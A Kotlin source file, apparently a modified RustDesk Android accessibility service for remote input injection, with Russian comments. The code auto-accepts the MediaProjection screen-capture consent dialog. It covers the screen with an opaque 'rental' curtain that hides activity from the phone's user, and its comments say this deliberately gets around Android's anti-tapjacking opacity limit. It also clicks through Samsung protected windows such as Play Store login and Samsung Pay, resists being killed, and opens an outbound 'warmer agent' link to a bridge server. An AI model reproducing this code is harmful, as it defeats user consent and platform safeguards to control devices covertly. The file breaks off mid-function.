package com.carriez.flutter_hbb

/**
 * Объединённый AccessibilityService:
 * 1. Обработка remote input (gesture, key, touch) — оригинальный InputService
 * 2. XmlCapture — захват экрана через дерево accessibility
 * 3. Keep-alive — сервис не даёт себя убить
 * 4. Авто-принятие диалога MediaProjection
 */

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_EDITOR
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Rect
import android.media.AudioManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent as KeyEventAndroid
import android.view.View
import android.view.ViewConfiguration
import android.view.ViewGroup.LayoutParams
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.EditText
import androidx.annotation.RequiresApi
import hbb.KeyEventConverter
import hbb.MessageOuterClass.KeyEvent
import hbb.MessageOuterClass.KeyboardMode
import java.lang.Character
import java.util.*
import kotlin.math.abs
import kotlin.math.max

// ---------------------------------------------------------------------------
// Top-level константы
// Объявлены здесь — старый InputService.kt должен быть удалён из проекта.
// Если константы уже объявлены в другом .kt файле пакета — удали их оттуда.
// ---------------------------------------------------------------------------
const val LEFT_DOWN = 9
const val LEFT_MOVE = 8
const val LEFT_UP = 10
const val RIGHT_UP = 18
// (BUTTON_BACK << 3) | BUTTON_UP
const val BACK_UP = 66
const val WHEEL_BUTTON_DOWN = 33
const val WHEEL_BUTTON_UP = 34
const val WHEEL_DOWN = 523331
const val WHEEL_UP = 963

const val TOUCH_SCALE_START = 1
const val TOUCH_SCALE = 2
const val TOUCH_SCALE_END = 3
const val TOUCH_PAN_START = 4
const val TOUCH_PAN_UPDATE = 5
const val TOUCH_PAN_END = 6

const val WHEEL_STEP = 120
const val WHEEL_DURATION = 50L
const val LONG_TAP_DELAY = 200L

class InputService : AccessibilityService() {

    companion object {
        var ctx: InputService? = null
        val isOpen: Boolean
            get() = ctx != null

        private const val KEEP_ALIVE_INTERVAL_MS = 5_000L
        private const val KEEP_ALIVE_LOOP_MS    = 60_000L  // фоновый поток как в EndlessService
        private const val PREFS_NAME = "input_service_prefs"
        private const val KEY_INPUT_ENABLED = "input_enabled"

        // Deep link на наш сервис в Accessibility Settings (трюк из AccessActivity.java)
        // Открывает настройки сразу на toggle нашего сервиса — без поиска в списке
        fun buildAccessibilityDeepLink(context: Context): Intent {
            val component = ComponentName(context, InputService::class.java)
            return Intent("android.settings.ACCESSIBILITY_SETTINGS").apply {
                putExtra(":settings:fragment_args_key", component.flattenToString())
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
        }

        // Сохраняем что пользователь включил Input Control через Accessibility
        fun saveInputEnabled(context: Context, enabled: Boolean) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_INPUT_ENABLED, enabled).apply()
        }

        // Был ли Input Control включён в прошлой сессии
        fun wasInputEnabled(context: Context): Boolean =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getBoolean(KEY_INPUT_ENABLED, false)
    }

    private val logTag = "input service"

    // -----------------------------------------------------------------------
    // Input state (оригинальный InputService)
    // -----------------------------------------------------------------------
    private var leftIsDown = false
    private var touchPath = Path()
    private var stroke: GestureDescription.StrokeDescription? = null
    private var lastTouchGestureStartTime = 0L
    private var mouseX = 0
    private var mouseY = 0
    private var timer = Timer()
    private var recentActionTask: TimerTask? = null
    private val longPressDuration =
        ViewConfiguration.getTapTimeout().toLong() + ViewConfiguration.getLongPressTimeout().toLong()
    private val wheelActionsQueue = LinkedList<GestureDescription>()
    private var isWheelActionsPolling = false
    private var isWaitingLongPress = false
    private var fakeEditTextForTextStateCalculation: EditText? = null
    private var lastX = 0
    private var lastY = 0
    private val volumeController: VolumeController by lazy {
        VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager)
    }

    // -----------------------------------------------------------------------
    // Keep-alive loop (как в EndlessService.java)
    // -----------------------------------------------------------------------
    @Volatile private var keepAliveLoopRunning = false

    // -----------------------------------------------------------------------
    // Кэш для ускорения ввода текста
    // -----------------------------------------------------------------------
    @Volatile private var cachedFocusedNode: AccessibilityNodeInfo? = null
    @Volatile private var cachedFocusedNodeTime = 0L
    private val FOCUS_CACHE_TTL_MS = 2_000L

    // -----------------------------------------------------------------------
    // Keep-alive
    // -----------------------------------------------------------------------
    private val keepAliveHandler = Handler(Looper.getMainLooper())
    private val keepAliveRunnable = object : Runnable {
        override fun run() {
            try { rootInActiveWindow?.recycle() } catch (_: Exception) {}
            keepAliveHandler.postDelayed(this, KEEP_ALIVE_INTERVAL_MS)
        }
    }

    // Отдельный поток для onAccessibilityEvent — не блокируем main thread,
    // иначе система помечает сервис как "malfunctioning" при задержке >5с
    private val eventThread = HandlerThread("InputServiceEvents").also { it.start() }
    private val eventHandler = Handler(eventThread.looper)

    // -----------------------------------------------------------------------
    // Lifecycle
    // -----------------------------------------------------------------------
    override fun onServiceConnected() {
        super.onServiceConnected()
        ctx = this
        Log.d(logTag, "onServiceConnected!")

        // Не пересоздаём ServiceInfo полностью — берём существующий из XML
        // и добавляем только FLAG_INPUT_METHOD_EDITOR (недоступен через XML).
        // Полная замена через setServiceInfo(new AccessibilityServiceInfo())
        // сбрасывает canPerformGestures и вызывает "malfunctioning".
        if (Build.VERSION.SDK_INT >= 33) {
            serviceInfo?.let { info ->
                info.flags = info.flags or FLAG_INPUT_METHOD_EDITOR
                setServiceInfo(info)
            }
        }

        fakeEditTextForTextStateCalculation = EditText(this)
        fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
        fakeEditTextForTextStateCalculation?.onPreDraw()

        keepAliveHandler.postDelayed(keepAliveRunnable, KEEP_ALIVE_INTERVAL_MS)

        // Сохраняем в SharedPreferences что сервис включён
        saveInputEnabled(applicationContext, true)

        // Уведомляем Flutter — Input Control активен
        Handler(Looper.getMainLooper()).post {
            MainActivity.flutterMethodChannel?.invokeMethod(
                "on_state_changed",
                mapOf("name" to "input", "value" to "true")
            )
        }

        // Логируем статус battery optimization
        checkBatteryOptimization()

        // Keep-alive фоновый поток — предотвращает усыпление JVM (из EndlessService.java)
        startKeepAliveLoop()

        // Bridge link to OpenClaw warmer agent (outbound WS to bridge VPS).
        // Uses RustDesk peer ID for per-device routing once available.
        try { WarmerService.start(this) } catch (e: Exception) {
            Log.w(logTag, "WarmerService start failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        ctx = null
        try { hideCurtain() } catch (_: Exception) {}
        try { WarmerService.stop() } catch (_: Exception) {}
        XmlCapture.stop()
        AutoClick.reset()
        keepAliveHandler.removeCallbacks(keepAliveRunnable)
        try { eventThread.quitSafely() } catch (_: Exception) {}
        try { keyInputThread.quitSafely() } catch (_: Exception) {}
        keepAliveLoopRunning = false
        Log.w(logTag, "onDestroy")
        // Намеренно НЕ уведомляем Flutter об отключении здесь.
        // Android (Doze mode) может убить и сам перезапустить AccessibilityService —
        // в этом случае Flutter не должен видеть это как "пользователь выключил".
        // Flutter проверит реальное состояние через onResume / check_service.
        super.onDestroy()
    }

    override fun onInterrupt() {}

    // -----------------------------------------------------------------------
    // Приватная штора «ИДЁТ АРЕНДА» как TYPE_ACCESSIBILITY_OVERLAY.
    //
    // Окно accessibility-overlay — доверенный overlay: Android 12+ НЕ
    // применяет к нему лимит непрозрачности 0.8 (анти-tapjacking), который
    // зажимает обычные TYPE_APPLICATION_OVERLAY. Поэтому отсюда штора
    // полностью непрозрачна, и при этом FLAG_NOT_TOUCHABLE пропускает
    // инжектированные жесты админа насквозь.
    // -----------------------------------------------------------------------

    private var curtainView: View? = null
    private var curtainWm: WindowManager? = null

    fun showCurtain() {
        if (curtainView != null) {
            Log.d(logTag, "showCurtain: already shown, skip")
            return
        }
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val flags =
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                PixelFormat.OPAQUE
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0; y = 0
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }
            val view = RentalCurtainView.build(this)
            wm.addView(view, params)
            curtainView = view
            curtainWm = wm
            Log.i("RentalBanner", "✅ [InputService] curtain ADDED as TYPE_ACCESSIBILITY_OVERLAY (opaque, not capped)")
            RentalCurtainView.applySkipScreenshot(view)
        } catch (e: Exception) {
            Log.e("RentalBanner", "❌ [InputService] showCurtain failed: ${e.javaClass.simpleName}: ${e.message}", e)
            curtainView = null
        }
    }

    fun hideCurtain() {
        curtainView?.let {
            try {
                curtainWm?.removeView(it)
                Log.i("RentalBanner", "[InputService] curtain removed")
            } catch (e: Exception) {
                Log.e("RentalBanner", "[InputService] hideCurtain removeView failed: ${e.message}")
            }
        }
        curtainView = null
        curtainWm = null
    }

    // -----------------------------------------------------------------------
    // AccessibilityEvent — делегируем в AutoClick
    // -----------------------------------------------------------------------
    override fun onAccessibilityEvent(event: AccessibilityEvent) {

      if (Build.VERSION.SDK_INT > 33) {
        return
      }



        val eventType = event.eventType

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {

            val pkg = event.packageName?.toString() ?: ""

            // Фильтр — обрабатываем только наши пакеты
            val targetPackages = listOf(
              "com.android.systemui",
              "com.android.settings",
              "com.carriez.flutter_hbb"
            )

            if (pkg.isNotEmpty() && !targetPackages.contains(pkg)) return

            // Сброс кэша при смене окна
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                invalidateFocusCache()
            }

            // Переносим в фон, используем rootInActiveWindow — надёжнее event.source
            eventHandler.post {
                var root: AccessibilityNodeInfo? = null
                try {
                    root = rootInActiveWindow
                    if (root != null) {
                        AutoClick.handleEvent(pkg, root)
                    } else {
                        // Fallback — перебираем все окна (Android 14+ с оверлеями)
                        processAllWindows(pkg)
                    }
                } catch (e: Exception) {
                    Log.e(logTag, "Error in background auto-click", e)
                } finally {
                    root?.recycle()
                }
            }
        }
    }

    /**
     * Перебираем все окна если rootInActiveWindow вернул null.
     * Помогает когда диалог MP отображается в системном слое поверх основного окна.
     * Требует flagRetrieveInteractiveWindows в accessibility_service_config.xml
     */
    private fun processAllWindows(pkg: String) {
        try {
            val wins = windows ?: return
            for (window in wins) {
                val root = window.root ?: continue
                try {
                    AutoClick.handleEvent(pkg, root)
                } finally {
                    root.recycle()
                }
            }
        } catch (e: Exception) {
            Log.e(logTag, "processAllWindows error", e)
        }
    }

    // -----------------------------------------------------------------------
    // Keep-alive loop (идея из EndlessService.java)
    // Фоновый поток не даёт JVM и Android усыпить процесс
    // -----------------------------------------------------------------------
    private fun startKeepAliveLoop() {
        if (keepAliveLoopRunning) return
        keepAliveLoopRunning = true
        Thread {
            Log.d(logTag, "keepAliveLoop started")
            while (keepAliveLoopRunning) {
                try {
                    Thread.sleep(KEEP_ALIVE_LOOP_MS)
                    // Лёгкий ping — проверяем что сервис жив
                    if (ctx != null) {
                        Log.v(logTag, "keepAliveLoop ping")
                    }
                } catch (e: InterruptedException) {
                    break
                }
            }
            Log.d(logTag, "keepAliveLoop stopped")
        }.also {
            it.isDaemon = true
            it.name = "InputServiceKeepAlive"
            it.start()
        }
    }

    // -----------------------------------------------------------------------
    // Battery optimization check
    // -----------------------------------------------------------------------
    private fun checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.d(logTag, "Battery optimization: DISABLED (protected) ✓")
            } else {
                Log.w(logTag, "Battery optimization: ENABLED — Doze may kill this service!")
                // Не открываем Settings автоматически отсюда —
                // это делает MainActivity при первом запуске приложения
            }
        } catch (e: Exception) {
            Log.e(logTag, "checkBatteryOptimization error", e)
        }
    }

    // -----------------------------------------------------------------------
    // XmlCapture API (вызывается из CaptureController)
    // -----------------------------------------------------------------------
    fun getRootNode(): AccessibilityNodeInfo? = rootInActiveWindow

    fun getWindowsList(): List<android.view.accessibility.AccessibilityWindowInfo> =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) windows ?: emptyList()
        else emptyList()

    // -----------------------------------------------------------------------
    // Mouse input
    // -----------------------------------------------------------------------
    @RequiresApi(Build.VERSION_CODES.N)
    fun onMouseInput(mask: Int, _x: Int, _y: Int) {
        val x = max(0, _x)
        val y = max(0, _y)

        if (mask == 0 || mask == LEFT_MOVE) {
            val oldX = mouseX
            val oldY = mouseY
            mouseX = x * SCREEN_INFO.scale
            mouseY = y * SCREEN_INFO.scale
            if (isWaitingLongPress) {
                val delta = abs(oldX - mouseX) + abs(oldY - mouseY)
                if (delta > 8) isWaitingLongPress = false
            }
        }

        if (mask == LEFT_DOWN) {
            isWaitingLongPress = true
            timer.schedule(object : TimerTask() {
                override fun run() {
                    if (isWaitingLongPress) {
                        isWaitingLongPress = false
                        continueGesture(mouseX, mouseY)
                    }
                }
            }, longPressDuration)
            leftIsDown = true
            startGesture(mouseX, mouseY)
            return
        }

        // LEFT_UP обрабатываем ДО универсального continueGesture: иначе
        // continueGesture здесь выставит stroke!=null и hybrid-tap fast-path
        // (ACTION_CLICK по защищённым окнам Samsung One UI) станет dead code.
        if (mask == LEFT_UP) {
            if (leftIsDown) {
                leftIsDown = false
                isWaitingLongPress = false
                val tapDuration = System.currentTimeMillis() - lastTouchGestureStartTime
                val delta = abs(mouseX - lastX) + abs(mouseY - lastY)
                val isTap = tapDuration < 300L && delta < 20
                // Чистый тап (без LEFT_MOVE между DOWN и UP) → пробуем
                // ACTION_CLICK по найденной accessibility-ноде. Samsung One UI
                // режет dispatchGesture в protected windows (Play Store login,
                // Samsung Pay, Knox-секурки), но ACTION_CLICK как accessibility-
                // действие пропускает — оно нужно TalkBack. Skip-правила и
                // защита от EditText/WebView — см. tryNodeClickAt ниже.
                if (isTap && stroke == null && tryNodeClickAt(mouseX, mouseY)) {
                    touchPath.reset()
                    return
                }
                // Fast-path не сработал — закрываем жест штатно: TOUCH_DOWN + UP.
                continueGesture(mouseX, mouseY)
                endGesture(mouseX, mouseY)
                return
            }
        }

        // LEFT_MOVE и прочие маски — продолжаем жест, если кнопка зажата.
        if (leftIsDown) continueGesture(mouseX, mouseY)

        if (mask == RIGHT_UP) { longPress(mouseX, mouseY); return }
        if (mask == BACK_UP) { performGlobalAction(GLOBAL_ACTION_BACK); return }

        if (mask == WHEEL_BUTTON_DOWN) {
            timer.purge()
            recentActionTask = object : TimerTask() {
                override fun run() {
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    recentActionTask = null
                }
            }
            timer.schedule(recentActionTask, LONG_TAP_DELAY)
        }

        if (mask == WHEEL_BUTTON_UP) {
            if (recentActionTask != null) {
                recentActionTask!!.cancel()
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
            return
        }

        if (mask == WHEEL_DOWN) {
            if (mouseY < WHEEL_STEP) return
            val path = Path().apply {
                moveTo(mouseX.toFloat(), mouseY.toFloat())
                lineTo(mouseX.toFloat(), (mouseY - WHEEL_STEP).toFloat())
            }
            wheelActionsQueue.offer(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, WHEEL_DURATION))
                    .build()
            )
            consumeWheelActions()
        }

        if (mask == WHEEL_UP) {
            if (mouseY < WHEEL_STEP) return
            val path = Path().apply {
                moveTo(mouseX.toFloat(), mouseY.toFloat())
                lineTo(mouseX.toFloat(), (mouseY + WHEEL_STEP).toFloat())
            }
            wheelActionsQueue.offer(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, WHEEL_DURATION))
                    .build()
            )
            consumeWheelActions()
        }
    }

    // -----------------------------------------------------------------------
    // Hybrid tap — ACTION_CLICK fast-path для protected windows
    // -----------------------------------------------------------------------
    // Samsung One UI режет dispatchGesture в защищённых окнах (Play Store
    // login, Google Account, Samsung Pay, Knox-секурки), но ACTION_CLICK
    // как accessibility-действие там работает — оно семантическое, нужно
    // TalkBack-у, поэтому Samsung его не блокирует.
    //
    // Применяется ТОЛЬКО на чистом тапе (isTap && stroke == null). Логика
    // повторяет проверенный upstream just-for-the-soul/rustdesk (commit
    // 182a1d25, "fix InputService 003"):
    //  • Если клик попал в окно мягкой клавиатуры (TYPE_INPUT_METHOD) —
    //    return false, fallback на dispatchGesture (реальный палец).
    //    Иначе ACTION_CLICK по ноде клавиши ломает state machine IME.
    //  • Если клик не попадает в bounds окна — continue к следующему.
    //  • Свой accessibility-overlay (RentalCurtainView) — continue (иначе
    //    штора съест клик админа: FLAG_NOT_TOUCHABLE не защищает от
    //    ACTION_CLICK).
    //
    // ИСТОРИЧЕСКИЕ ПРАВКИ (отозваны):
    //  - editable-skip / clickable-parent guard / WebView-blacklist — ввёл
    //    как defence-in-depth, но WebView-blacklist ломал Google Play
    //    sign-in (он сам WebView), а editable-skip упирался в clickable-
    //    обёртки. Upstream 003 этих guard-ов не имеет и работает корректно
    //    (включая IME и Play Store login). Откатываемся на минимальную
    //    логику + наши must-haves (overlay-skip, win.recycle, depth-cap).
    // -----------------------------------------------------------------------
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun tryNodeClickAt(x: Int, y: Int): Boolean {
        val wins = try { windows } catch (_: Throwable) { null } ?: return false
        return try {
            for (win in wins) {
                try {
                    // Свой accessibility-overlay (штора) — мимо.
                    if (win.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) {
                        continue
                    }
                    // Bounds-check: если клик не в этом окне — следующее.
                    val winRect = Rect()
                    win.getBoundsInScreen(winRect)
                    if (!winRect.contains(x, y)) continue
                    // Клик в окне мягкой клавиатуры — аборт всего fast-path,
                    // чтобы fallback (dispatchGesture) дошёл реальным пальцем.
                    // Без этого клавиатура ломалась после первой же клавиши.
                    if (win.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                        return false
                    }
                    val root = win.root ?: continue
                    try {
                        val node = findClickableNodeAt(root, x, y, 0) ?: continue
                        val ok = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        node.recycle()
                        if (ok) {
                            Log.d(logTag, "NodeClick OK at $x,$y")
                            return true
                        }
                    } finally {
                        root.recycle()
                    }
                } finally {
                    win.recycle()
                }
            }
            false
        } catch (e: Exception) {
            Log.e(logTag, "tryNodeClickAt error: $e")
            false
        }
    }

    /**
     * Возвращает свежеobtain()ed кликабельную НЕредактируемую ноду, содержащую
     * (x,y). Caller обязан recycle. depth-cap (64) — защита от глубоких
     * Compose/WebView trees.
     *
     * Editable-логика: если текущая нода (или любой её предок на пути) —
     * editable, мы НЕ возвращаем ни саму ноду, ни найденный в потомках
     * кликабельный таргет. ACTION_CLICK по editable-полям (EditText /
     * Compose TextField / Chrome omnibox / google.com search input в WebView)
     * c isAccessibilityTool ловит focus-juggling и моргает IME. Пусть лучше
     * отработает dispatchGesture (настоящее касание) — IME поднимется чисто.
     *
     * "Editable" определяем по двум сигналам:
     *   • node.isEditable (классический EditText + многие Compose TextField);
     *   • action ACTION_SET_TEXT в actionList — canonical-сигнал для HTML
     *     <input> в WebView и для Compose-TextField на старых Compose, где
     *     isEditable может не выставляться.
     */
    private fun findClickableNodeAt(
        node: AccessibilityNodeInfo,
        x: Int,
        y: Int,
        depth: Int
    ): AccessibilityNodeInfo? {
        if (depth > 64) return null
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (!rect.contains(x, y)) return null

        val nodeEditable = isEditableLike(node)

        // Самая глубокая кликабельная нода — спускаемся в детей первой.
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            try {
                val found = findClickableNodeAt(child, x, y, depth + 1)
                if (found != null) {
                    // Если текущая нода — editable, найденный clickable-потомок
                    // (span/icon внутри текстового поля) НЕ возвращаем: клик
                    // семантически принадлежит editable-контейнеру → fallback.
                    if (nodeEditable) return null
                    return found
                }
            } finally {
                child.recycle()
            }
        }

        // Сама нода — editable → fallback на dispatchGesture.
        if (nodeEditable) return null

        return if (node.isClickable && node.isEnabled) AccessibilityNodeInfo.obtain(node) else null
    }

    private fun isEditableLike(node: AccessibilityNodeInfo): Boolean {
        if (node.isEditable) return true
        try {
            for (a in node.actionList) {
                if (a.id == AccessibilityNodeInfo.ACTION_SET_TEXT) return true
            }
        } catch (_: Throwable) {}
        return false
    }

    // -----------------------------------------------------------------------
    // Touch input
    // -----------------------------------------------------------------------
    @RequiresApi(Build.VERSION_CODES.N)
    fun onTouchInput(mask: Int, _x: Int, _y: Int) {
        when (mask) {
            TOUCH_PAN_UPDATE -> {
                mouseX -= _x * SCREEN_INFO.scale
                mouseY -= _y * SCREEN_INFO.scale
                mouseX = max(0, mouseX)
                mouseY = max(0, mouseY)
                continueGesture(mouseX, mouseY)
            }
            TOUCH_PAN_START -> {
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
                startGesture(mouseX, mouseY)
            }
            TOUCH_PAN_END -> {
                endGesture(mouseX, mouseY)
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
            }
            else -> {}
        }
    }

    // -----------------------------------------------------------------------
    // Gesture helpers
    // -----------------------------------------------------------------------
    @RequiresApi(Build.VERSION_CODES.N)
    private fun consumeWheelActions() {
        if (isWheelActionsPolling) return
        isWheelActionsPolling = true
        wheelActionsQueue.poll()?.let {
            dispatchGesture(it, null, null)
            timer.purge()
            timer.schedule(object : TimerTask() {
                override fun run() {
                    isWheelActionsPolling = false
                    consumeWheelActions()
                }
            }, WHEEL_DURATION + 10)
        } ?: run { isWheelActionsPolling = false }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun performClick(x: Int, y: Int, duration: Long) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        try {
            val builder = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
            Log.e(logTag, "performClick error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun longPress(x: Int, y: Int) = performClick(x, y, longPressDuration)

    private fun startGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) touchPath.reset()
        else touchPath = Path()
        touchPath.moveTo(x.toFloat(), y.toFloat())
        lastTouchGestureStartTime = System.currentTimeMillis()
        lastX = x; lastY = y
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun doDispatchGesture(x: Int, y: Int, willContinue: Boolean) {
        touchPath.lineTo(x.toFloat(), y.toFloat())
        var duration = System.currentTimeMillis() - lastTouchGestureStartTime
        if (duration <= 0) duration = 1
        try {
            stroke = if (stroke == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    GestureDescription.StrokeDescription(touchPath, 0, duration, willContinue)
                else GestureDescription.StrokeDescription(touchPath, 0, duration)
            } else {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    stroke?.continueStroke(touchPath, 0, duration, willContinue)
                else GestureDescription.StrokeDescription(touchPath, 0, duration)
            }
            stroke?.let {
                dispatchGesture(GestureDescription.Builder().addStroke(it).build(), null, null)
            }
        } catch (e: Exception) {
            Log.e(logTag, "doDispatchGesture error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun continueGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, true)
            touchPath.reset()
            touchPath.moveTo(x.toFloat(), y.toFloat())
            lastTouchGestureStartTime = System.currentTimeMillis()
            lastX = x; lastY = y
        } else {
            touchPath.lineTo(x.toFloat(), y.toFloat())
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, false)
            touchPath.reset()
            stroke = null
        } else {
            try {
                touchPath.lineTo(x.toFloat(), y.toFloat())
                var duration = System.currentTimeMillis() - lastTouchGestureStartTime
                if (duration <= 0) duration = 1
                val s = GestureDescription.StrokeDescription(touchPath, 0, duration)
                dispatchGesture(GestureDescription.Builder().addStroke(s).build(), null, null)
            } catch (e: Exception) {
                Log.e(logTag, "endGesture error:$e")
            }
        }
    }

    // -----------------------------------------------------------------------
    // Key event
    // -----------------------------------------------------------------------
    // Отдельный handler — не засоряем main looper, убираем задержку
    private val keyInputThread = HandlerThread("KeyInputThread").also { it.start() }
    private val keyInputHandler = Handler(keyInputThread.looper)

    private fun getCachedFocusedNode(): AccessibilityNodeInfo? {
        val now = System.currentTimeMillis()
        if (now - cachedFocusedNodeTime > FOCUS_CACHE_TTL_MS) {
            cachedFocusedNode = null
            return null
        }
        return cachedFocusedNode?.takeIf {
            try { it.refresh() } catch (_: Exception) { false }
        }
    }

    private fun updateFocusCache(node: AccessibilityNodeInfo) {
        cachedFocusedNode = node
        cachedFocusedNodeTime = System.currentTimeMillis()
    }

    fun invalidateFocusCache() {
        cachedFocusedNode = null
        cachedFocusedNodeTime = 0L
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onKeyEvent(data: ByteArray) {
        val keyEvent = KeyEvent.parseFrom(data)
        val keyboardMode = keyEvent.getMode()
        var textToCommit: String? = null

        if (keyEvent.hasSeq()) {
            textToCommit = keyEvent.getSeq()
        } else if (keyboardMode == KeyboardMode.Legacy) {
            if (keyEvent.hasChr() && (keyEvent.getDown() || keyEvent.getPress())) {
                keyEvent.getChr()?.let { textToCommit = String(Character.toChars(it)) }
            }
        }

        var ke: KeyEventAndroid? = null
        if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
            ke = KeyEventConverter.toAndroidKeyEvent(keyEvent)
        }
        ke?.let {
            if (tryHandleVolumeKeyEvent(it)) return
            if (tryHandlePowerKeyEvent(it)) return
        }

        if (Build.VERSION.SDK_INT >= 33) {
            // Быстрый путь через InputConnection
            val ic = getInputMethod()?.getCurrentInputConnection()
            if (ic != null) {
                if (textToCommit != null) {
                    ic.commitText(textToCommit, 1, null)
                } else {
                    ke?.let { event ->
                        ic.sendKeyEvent(event)
                        if (keyEvent.getPress()) {
                            ic.sendKeyEvent(KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode))
                        }
                    }
                }
                return
            }
            // Fallback если InputConnection недоступен
        }

        // Android < 33 (и fallback для 33+):
        // keyInputHandler — не блокируем main looper
        keyInputHandler.post {
            ke?.let { event ->
                // Сначала пробуем кэшированный node
                val cached = getCachedFocusedNode()
                if (cached != null && trySendKeyEvent(event, cached, textToCommit)) {
                    if (keyEvent.getPress()) {
                        trySendKeyEvent(
                            KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode),
                            cached, textToCommit
                        )
                    }
                    return@post
                }
                // Кэш промах — ищем заново
                for (item in possibleAccessibiltyNodes()) {
                    if (trySendKeyEvent(event, item, textToCommit)) {
                        updateFocusCache(item)
                        if (keyEvent.getPress()) {
                            trySendKeyEvent(
                                KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode),
                                item, textToCommit
                            )
                        }
                        break
                    }
                }
            }
        }
    }

    private fun tryHandleVolumeKeyEvent(event: KeyEventAndroid): Boolean {
        when (event.keyCode) {
            KeyEventAndroid.KEYCODE_VOLUME_UP -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN)
                    volumeController.raiseVolume(null, true, AudioManager.STREAM_SYSTEM)
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_DOWN -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN)
                    volumeController.lowerVolume(null, true, AudioManager.STREAM_SYSTEM)
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_MUTE -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN)
                    volumeController.toggleMute(true, AudioManager.STREAM_SYSTEM)
                return true
            }
            else -> return false
        }
    }

    private fun tryHandlePowerKeyEvent(event: KeyEventAndroid): Boolean {
        if (event.keyCode == KeyEventAndroid.KEYCODE_POWER) {
            if (event.action == KeyEventAndroid.ACTION_UP)
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
            return true
        }
        return false
    }

    // -----------------------------------------------------------------------
    // Text node helpers
    // -----------------------------------------------------------------------
    private fun insertAccessibilityNode(
        list: LinkedList<AccessibilityNodeInfo>, node: AccessibilityNodeInfo
    ) {
        if (!list.contains(node)) list.add(node)
    }

    private fun findChildNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        node ?: return null
        if (node.isEditable && node.isFocusable) return node
        val childCount = node.childCount
